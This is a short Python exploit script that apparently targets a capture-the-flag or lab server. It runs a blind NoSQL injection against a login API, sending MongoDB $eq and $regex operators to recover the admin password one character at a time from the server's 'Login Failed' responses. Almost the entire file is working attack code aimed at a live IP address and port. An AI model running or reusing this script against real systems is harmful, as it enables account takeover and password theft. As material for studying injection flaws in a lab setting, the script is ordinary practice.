import re
import requests

final = ""

for x in range(len(final), 100): 
    for y in range(0x20, 0x80): # for every x position, try the character y (0x20 - 0x7e are the "characters" in the ASCII table)
        if y == 0x7f:
            print("done!")
            __import__("sys").exit()
        
        y = chr(y)

        sqli = {
            "username": {"$eq": "admin"},
            "password": {"$regex": f"^{re.escape(final+y)}" } # we send in what we know of the current password + a 1 character guess
        }
        res = requests.post("http://138.68.177.159:31116/api/login", json=sqli).text 

        if "Login Failed" not in res: # if we successfully log in, we know the next character in the password
            final += y
            break
    print(final)